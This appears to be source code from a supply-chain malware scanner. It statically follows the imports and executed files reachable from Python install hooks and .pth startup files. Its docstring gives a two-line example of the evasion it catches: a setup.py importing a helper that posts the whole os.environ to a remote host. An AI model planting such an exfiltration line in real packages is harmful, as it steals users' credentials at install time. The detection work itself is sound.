"""Which files an install hook actually runs.

Install-time context is the difference between a finding and a note. Reading
credentials and making a network call is what an application does all day; doing
it during `pip install`, unprompted, as the user, before any test or review or
container boundary applies, is the attack. The engine already escalates on that
distinction -- `credential + egress` inside a hook is `MALWARE.EXFIL`, and
outside one needs a third signal.

The context was attached to the hook file and nothing else, so the escalation
was avoided by moving the payload one file over:

    # setup.py
    import _bootstrap; _bootstrap.init()

    # _bootstrap.py -- entirely direct syntax, and invisible
    urllib.request.urlopen("https://" + host, data=str(dict(os.environ)).encode())

No obfuscation, no cleverness: relocation into a helper module, which is how
every non-trivial package is structured anyway. That made it the cheapest bypass
in the tool and the one least likely to look like an attack in review.

What runs at install time is the hook *and everything it imports*, so that is
what carries the context. This resolves the closure statically -- it reads
imports, it never executes anything -- and only follows first-party modules,
because a payload inside `requests` is not this repository's file to judge.
"""

from __future__ import annotations

import ast
import re
from pathlib import PurePosixPath
from typing import TYPE_CHECKING, ClassVar

from cordon_scanner.analysis.python.pysyntax import PythonSyntax
from cordon_scanner.foundation.paths import ContainerPaths

if TYPE_CHECKING:
    from collections.abc import Callable, Iterable, Iterator, Mapping, Sequence

    from cordon_scanner.detect.base import FileUnit
    from cordon_scanner.engine.pipeline.accumulator import Accumulator

MAX_DEPTH = 4
"""How far to follow imports from a hook.

Deep enough for the shapes that occur -- `setup.py` imports a bootstrap module
which imports a helper -- and bounded because the graph is attacker-supplied and
a cycle or a wide fan-out would otherwise be unbounded work. Cycles are handled
by the visited set; this bounds breadth-first cost as well.
"""

MAX_FILES = 500
"""Ceiling on the closure size, for the same reason."""


class ImportClosure:
    """Resolves the first-party modules a Python file imports, transitively."""

    @staticmethod
    def candidates(module: str, importer: str) -> list[str]:
        """Repository paths a dotted module name could refer to.

        Both layouts are tried because both are ordinary: `a.b` as `a/b.py` and
        as `a/b/__init__.py`. Relative imports resolve against the importing
        file's directory, which is what makes `from . import helper` work.
        """
        if module.startswith("/"):  # a relative import, already a path (`imported_by`)
            stem = module[1:]
            return [f"{stem}.py", f"{stem}/__init__.py"]
        parts = module.split(".")
        base = PurePosixPath(importer).parent
        joined = "/".join(parts)
        return [
            f"{joined}.py",
            f"{joined}/__init__.py",
            str(base / f"{joined}.py") if str(base) != "." else f"{joined}.py",
            str(base / joined / "__init__.py") if str(base) != "." else f"{joined}/__init__.py",
        ]

    @staticmethod
    def installed_module(module: str, importer: str, texts: Mapping[str, str]) -> list[str]:
        """For a `.pth` importer, the package's own files a module name is, wherever the package
        keeps them: a `.pth` runs from site-packages, where `src/pkg/mod.py` and
        `purelib/pkg/mod.py` are installed as `pkg/mod.py`. Only within the importer's archive."""
        if not importer.endswith(".pth") or module.startswith("/"):
            return []
        archive = importer.rpartition("!")[0]
        joined = "/".join(module.split("."))
        ends = (f"/{joined}.py", f"/{joined}/__init__.py")
        return sorted(
            path
            for path in texts
            if path.rpartition("!")[0] == archive and f"/{path.rpartition('!')[2]}".endswith(ends)
        )

    @classmethod
    def imported_by(cls, source: str, importer: str) -> list[str]:
        """Module names a file imports, with relative imports resolved.

        Parsed, never executed -- `ast.parse` builds a tree and runs nothing,
        which is the same reason the pypi ecosystem reads `setup.py` this way.
        A file that will not parse yields nothing rather than raising: it is
        malformed Python, and the caller has better things to say about that
        than this helper does.
        """
        try:
            tree = PythonSyntax.parse(source)
        except (SyntaxError, ValueError, RecursionError):
            return []

        found: list[str] = []
        base = PurePosixPath(importer).parent
        # Imports written inside a command class an install never runs are not
        # install-time imports. See `_inert_command_classes`.
        inert = cls._inert_command_classes(tree)
        skip: set[int] = set()
        if inert:
            for node in ast.walk(tree):
                if isinstance(node, ast.ClassDef) and node.name in inert:
                    skip.update(id(inner) for inner in ast.walk(node))
        for node in ast.walk(tree):
            if id(node) in skip:
                continue
            if isinstance(node, ast.Import):
                found.extend(alias.name for alias in node.names)
            elif isinstance(node, ast.ImportFrom):
                if node.level:
                    # `from . import x` / `from .pkg import y`. Walk up one
                    # directory per extra dot, as Python does.
                    prefix = base
                    for _ in range(node.level - 1):
                        prefix = prefix.parent
                    # Kept as a path, marked by a leading "/", never flattened to dots: a package
                    # archive's directories carry dots and "!" (`pkg-1.0.tar.gz!pkg-1.0/pkg`), and
                    # `from .core import run` there resolved to nothing (09 3a).
                    module_path = node.module.replace(".", "/") if node.module else ""
                    stem = f"{prefix}/{module_path}" if module_path else str(prefix)
                    stem = stem.strip("/")
                    found.append(f"/{stem}")
                    found.extend(f"/{stem}/{alias.name}" for alias in node.names)
                elif node.module:
                    found.append(node.module)
                    # `from pkg import module` may name a module rather than a
                    # symbol; both readings are tried and the one that exists in
                    # the repository wins.
                    found.extend(f"{node.module}.{alias.name}" for alias in node.names)
        return found

    #: `cmdclass` commands that run when somebody installs or builds the package.
    #:
    #: `PypiEcosystem.CONSUMER_INSTALL_COMMANDS` is the narrower question -- what
    #: reaches a consumer installing a wheel. This is the wider one, because a
    #: build is still install-time execution on somebody's machine.
    INSTALL_TIME_COMMANDS = frozenset(
        {
            "install",
            "install_lib",
            "install_scripts",
            "install_data",
            "build",
            "build_py",
            "build_ext",
            "build_clib",
            "bdist_wheel",
            "bdist_egg",
            "develop",
            "egg_info",
            "sdist",
        }
    )

    @classmethod
    def _inert_command_classes(cls, tree: ast.Module) -> set[str]:
        """Classes wired to a `cmdclass` command that an install never runs.

        `sympy`'s `setup.py` imports no sympy at module level. The three that
        exist are inside `test_sympy` and `antlr`, wired as
        `cmdclass={'test': test_sympy, 'antlr': antlr}` -- commands a person runs
        deliberately, and `pip install` never does. Following them anyway put 233
        files of sympy into install-time context, and
        `sympy/external/importtools.py` -- whose `__import__(module + '.' +
        submod)` is how a library probes for an optional dependency -- became
        `MALWARE.DYNAMIC_DISPATCH.001` at CRITICAL.

        The inverse is the shape this closure exists to catch, and it is
        untouched: `cmdclass={"install": CustomInstall}` names a command in
        `INSTALL_TIME_COMMANDS`, so its imports are still followed. 82 of the 252
        real malicious PyPI packages that survived the recall work are written
        that way -- see `PypiEcosystem._install_override_hook`.

        Only classes that are actually WIRED count. A command class nobody
        registers runs on nobody's machine either way, and leaving it followed
        keeps this from turning into a way to hide an import.
        """
        wired: dict[str, str] = {}
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            for keyword in node.keywords:
                if keyword.arg != "cmdclass" or not isinstance(keyword.value, ast.Dict):
                    continue
                for key, value in zip(keyword.value.keys, keyword.value.values, strict=False):
                    if (
                        isinstance(key, ast.Constant)
                        and isinstance(key.value, str)
                        and isinstance(value, ast.Name)
                    ):
                        wired[value.id] = key.value
        return {name for name, command in wired.items() if command not in cls.INSTALL_TIME_COMMANDS}

    #: Calls that run a file's text as Python, the argument holding its path:
    #: `runpy.run_path(p)`, `execfile(p)` (Python 2), `spec_from_file_location(name, p)`,
    #: `SourceFileLoader(name, p)`. `exec`/`compile` of a file's text are read separately.
    _RUNS_A_PATH: ClassVar[dict[str, int]] = {
        "run_path": 0,
        "execfile": 0,
        "spec_from_file_location": 1,
        "SourceFileLoader": 1,
    }

    @staticmethod
    def _literal_path(node: ast.AST) -> str | None:
        """A path written as a literal: `"x.txt"`, or `os.path.join(<anything>, "d", "x.txt")`
        (the trailing literal parts; a `dirname(__file__)` base is the importer's directory)."""
        if isinstance(node, ast.Constant) and isinstance(node.value, str):
            return node.value
        if (
            isinstance(node, ast.Call)
            and isinstance(node.func, ast.Attribute)
            and node.func.attr == "join"
            and node.args
        ):
            tail: list[str] = []
            for arg in reversed(node.args):
                if not (isinstance(arg, ast.Constant) and isinstance(arg.value, str)):
                    break
                tail.insert(0, arg.value)
            return "/".join(tail) if tail else None
        return None

    @classmethod
    def _read_text_of(cls, node: ast.AST) -> str | None:
        """The literal path whose text `node` is: `open(p).read()`, `open(p, ...).read()`,
        `io.open(p).read()`, `Path(p).read_text()`."""
        if not (isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute)):
            return None
        inner = node.func.value
        if node.func.attr == "read" and isinstance(inner, ast.Call) and inner.args:
            name = (
                inner.func.attr
                if isinstance(inner.func, ast.Attribute)
                else getattr(inner.func, "id", "")
            )
            return cls._literal_path(inner.args[0]) if name == "open" else None
        if node.func.attr == "read_text" and isinstance(inner, ast.Call) and inner.args:
            name = (
                inner.func.attr
                if isinstance(inner.func, ast.Attribute)
                else getattr(inner.func, "id", "")
            )
            return cls._literal_path(inner.args[0]) if name in ("Path", "PurePath") else None
        return None

    @classmethod
    def executed_by(cls, source: str) -> list[str]:
        """Literal paths a Python file runs as Python, whatever their names (item 39's evasion
        suite: `setup.py` running `exec(open("run.txt").read())` ran a payload no rule read as
        install-time Python). Parsed, never executed; a computed path is not followed here, and
        is what the dynamic-execution rules are for."""
        try:
            tree = PythonSyntax.parse(source)
        except (SyntaxError, ValueError, RecursionError):
            return []
        found: list[str] = []
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call) or not node.args:
                continue
            func = node.func
            name = func.attr if isinstance(func, ast.Attribute) else getattr(func, "id", "")
            if name in ("exec", "eval"):
                first = node.args[0]
                if (
                    isinstance(first, ast.Call)
                    and getattr(first.func, "id", "") == "compile"
                    and first.args
                ):
                    first = first.args[0]
                path = cls._read_text_of(first)
            elif name in cls._RUNS_A_PATH and len(node.args) > cls._RUNS_A_PATH[name]:
                path = cls._literal_path(node.args[cls._RUNS_A_PATH[name]])
            else:
                continue
            if path:
                found.append(path)
        return found

    @classmethod
    def resolve(
        cls,
        hooks: Iterable[str],
        sources: Mapping[str, str],
        others: Callable[[str], str | None] | None = None,
        *,
        shipped: Iterable[str] = (),
        unshipped: list[tuple[str, str]] | None = None,
    ) -> set[str]:
        """Every first-party file reachable by import from a hook.

        `sources` is the repository's Python files by path, so "first-party"
        means "a file in this scan" -- an import that resolves to nothing here
        is a third-party package and is not followed. That boundary is the point:
        the question is which of *these* files run at install time.
        """
        seen: set[str] = set()
        # Sorted, as `roots` below: the walk stops at MAX_FILES, so its order must not depend
        # on the hash seed of a set (review 98 #23).
        frontier = [(path, 0) for path in sorted(hooks) if path in sources]
        # Where an absolute import resolves: the directory the hook runs from, which is
        # `sys.path[0]` for `python setup.py`. Relative to the importing file only, an
        # `import setup.install_command` written in `setup/__init__.py` was looked for at
        # `setup/setup/install_command.py`, so a sdist that kept its install command in a
        # package beside `setup.py` ran that command unread as install-time code (review 98:
        # randrange, whose command sends the environment away).
        roots = sorted({str(PurePosixPath(path).parent) for path in hooks if path in sources})

        texts = dict(sources)
        hidden = cls.hidden_modules(sources)
        # Every file of the scan by its name: a path built with `os.path.join(here, "pkg",
        # "_version.py")` is read as its last literal, `_version.py`, and is the shipped file of
        # that name (8 of 10 PyPI sdists whose literal was not at the root, 3 Nov).
        by_name: dict[str, list[str]] = {}
        for known in sorted({*sources, *shipped}):
            by_name.setdefault(PurePosixPath(known).name, []).append(known)
        while frontier and len(seen) < MAX_FILES:
            path, depth = frontier.pop()
            if depth >= MAX_DEPTH:
                continue
            # A file this one runs by its literal path is install-time Python too, whatever its
            # name; read only when named, so no other file's text is decoded for this (note 80).
            here = str(PurePosixPath(path).parent)
            for target in cls.executed_by(texts[path]):
                found = cls._run_target(
                    target, (here, roots), (by_name, hidden), texts, others, seen
                )
                if found is not None:
                    frontier.append((found, depth + 1))
                elif unshipped is not None and not cls._already_run(
                    target, (here, roots), (by_name, hidden), seen
                ):
                    unshipped.append((path, target))
            for module in cls.imported_by(texts[path], path):
                rooted = [
                    f"{root}/{'/'.join(module.split('.'))}{suffix}"
                    for root in roots
                    if root != "." and not module.startswith("/")
                    for suffix in (".py", "/__init__.py")
                ]
                shipped_here = False
                for candidate in [
                    *cls.candidates(module, path),
                    *rooted,
                    *cls.installed_module(module, path, texts),
                ]:
                    normalised = re.sub(r"^(?:\./)+", "", candidate)
                    if normalised in texts:
                        shipped_here = True
                        if normalised not in seen:
                            seen.add(normalised)
                            frontier.append((normalised, depth + 1))
                if not shipped_here:
                    # A relative import is looked up here as it always was, dotted.
                    dotted = module[1:].replace("/", ".") if module.startswith("/") else module
                    for reading in hidden.get(dotted, ()):
                        if reading not in seen:
                            seen.add(reading)
                            frontier.append((reading, depth + 1))
        return seen

    @classmethod
    def _tiers(
        cls,
        target: str,
        where: tuple[str, list[str]],
        names: tuple[dict[str, list[str]], dict[str, list[str]]],
    ) -> Iterator[str]:
        """Where a file run by its path is looked for, in order: the literal path from the running
        file and each hook's directory; the shipped file of that name; Python shipped under that
        name as something else (`hidden_modules`)."""
        here, roots = where
        by_name, hidden = names
        name = PurePosixPath(target).name
        for candidate in (
            f"{here}/{target}" if here != "." else target,
            *(f"{r}/{target}" for r in roots if r != "."),
            *by_name.get(name, ()),
            *hidden.get(name.split(".", 1)[0], ()),
        ):
            yield re.sub(r"^(?:\./)+", "", str(PurePosixPath(candidate)))

    @classmethod
    def _already_run(
        cls,
        target: str,
        where: tuple[str, list[str]],
        names: tuple[dict[str, list[str]], dict[str, list[str]]],
        seen: set[str],
    ) -> bool:
        return any(c in seen for c in cls._tiers(target, where, names))

    @classmethod
    def _run_target(
        cls,
        target: str,
        where: tuple[str, list[str]],
        names: tuple[dict[str, list[str]], dict[str, list[str]]],
        texts: dict[str, str],
        others: Callable[[str], str | None] | None,
        seen: set[str],
    ) -> str | None:
        """The file a literal path runs, newly reached, read into `texts`; None when it was
        already reached or the package ships nothing it could be (the caller tells the two
        apart with `_already_run`: the second is said, never dropped)."""
        for candidate in cls._tiers(target, where, names):
            if candidate in seen:
                return None
            text = texts.get(candidate)
            if text is None and others is not None:
                text = others(candidate)
            if text is not None:
                texts[candidate] = text
                seen.add(candidate)
                return candidate
        return None

    @staticmethod
    def unshipped_gaps(acc: Accumulator, unshipped: Sequence[tuple[str, str]]) -> None:
        """Each file install-time Python runs by its path that the package does not ship, as a
        blocking gap at the file that runs it: what would run is unknown, and an unknown at install
        is not passed (fail closed). Measured on 42,000 PyPI sdists, 3 Nov: 2, both 0.0.0
        placeholders whose setup.py runs a file they do not carry."""
        from cordon_scanner.foundation.models import Severity
        from cordon_scanner.foundation.results import OperationalFinding

        for path, target in dict.fromkeys(unshipped):
            acc.incomplete(
                OperationalFinding.build(
                    path=path,
                    rule_id="OPERATIONAL.INSTALL.CODE_NOT_SHIPPED",
                    message=(
                        f"{path} runs {target!r} at install by its path, and the package ships "
                        "no file of that name: what would run is not in what was scanned."
                    ),
                    remediation="Vet where that file comes from before installing.",
                    # The scan is incomplete, and says so by its exit (4), as every gap does: a
                    # HIGH finding here made it a findings exit (1) and hid that it is a gap.
                    severity=Severity.MEDIUM,
                )
            )

    @staticmethod
    def hidden_modules(sources: Iterable[str]) -> dict[str, list[str]]:
        """The modules Python is shipped as under another name, by the module name they would be
        imported as: `run.js#as-python.py`, a reading of Python bytes named `run.js`
        (`ContentLanguage`), is module `run`, and inside `tools/` module `tools.run`.

        An import resolving to no `.py` file of the scan resolves to one of these: `setup.py`'s
        `import run` beside Python named `run.js`, in a zip in the package, was install-time code
        the scan never linked (evasion suite B). Only readings, so a missing import is otherwise
        still a third-party package: 306 of 42,000 PyPI sdists import a module they do not ship
        (`imp`, `ez_setup`, `skbuild`), and none of them is this.
        """
        hidden: dict[str, list[str]] = {}
        for path in sorted(sources):
            original = ContainerPaths.read_from(path)
            if original is None:
                continue
            inside = ContainerPaths.within_container(original)
            directory, _, name = inside.rpartition("/")
            stem = name.split(".", 1)[0]
            if not stem.isidentifier():
                continue
            parts = [p for p in directory.split("/") if p]
            for depth in range(len(parts) + 1):
                prefix = parts[len(parts) - depth :]
                if all(p.isidentifier() for p in prefix):
                    hidden.setdefault(".".join([*prefix, stem]), []).append(path)
        return hidden


class StartupClosure:
    """What runs at every interpreter start once a package is installed."""

    @staticmethod
    def of(
        units: Sequence[FileUnit], entries: Iterable[str]
    ) -> tuple[frozenset[str], frozenset[tuple[str, int, int]]]:
        """The `.pth` hooks among `entries` and every file their import lines reach, and the bodies
        those imports never run. A `.pth`'s `import X` imports X at every interpreter start, so
        what runs is what importing runs (`LoadReach`), not an install hook's reach: an install
        closure would make every function of an imported package install code (fattummy 1.0.1)."""
        from cordon_scanner.analysis.python.pyast import PythonSource
        from cordon_scanner.analysis.python.reachability import LoadReach
        from cordon_scanner.engine.closure import ImportClosure

        startup = {path for path in entries if path.endswith(".pth")}
        if not startup:
            return frozenset(), frozenset()
        sources = {
            unit.path: unit.content.text
            for unit in units
            if unit.path.endswith(".py") and not unit.content.is_binary
        }
        sources.update(
            {
                unit.path: PythonSource.startup_lines(unit.content.text)
                for unit in units
                if unit.path in startup and not unit.content.is_binary
            }
        )
        reached = ImportClosure.resolve(startup, sources)
        modules = sorted(path for path in reached if path.endswith(".py"))
        return frozenset(startup | reached), LoadReach.deferred_lines(modules, sources)


__all__ = ["ImportClosure", "StartupClosure"]
